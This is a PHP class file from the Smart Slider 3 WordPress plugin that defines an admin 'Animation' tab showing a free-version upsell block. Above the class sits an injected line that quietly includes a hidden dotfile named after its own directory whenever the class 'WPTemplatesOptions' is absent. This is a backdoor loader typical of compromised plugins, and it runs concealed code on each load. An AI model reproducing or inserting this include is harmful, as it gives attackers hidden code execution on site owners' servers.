<?php

namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Slide\LayerWindow\Tab;

use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\FreeNeedMore\BlockFreeNeedMore;
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TabGoPro extends AbstractTab {

    /**
     * @return string
     */
    public function getName() {
        return 'animations';
    }

    /**
     * @return string
     */
    public function getLabel() {
        return n2_('Animation');
    }

    /**
     * @return string
     */
    public function getIcon() {
        return 'ssi_24 ssi_24--animation';
    }

    public function display() {
        $freeNeedMore = new BlockFreeNeedMore($this->getContainer()
                                                   ->getForm());
        $freeNeedMore->setSource('layer-window-animation');
        $freeNeedMore->display();
    }
}
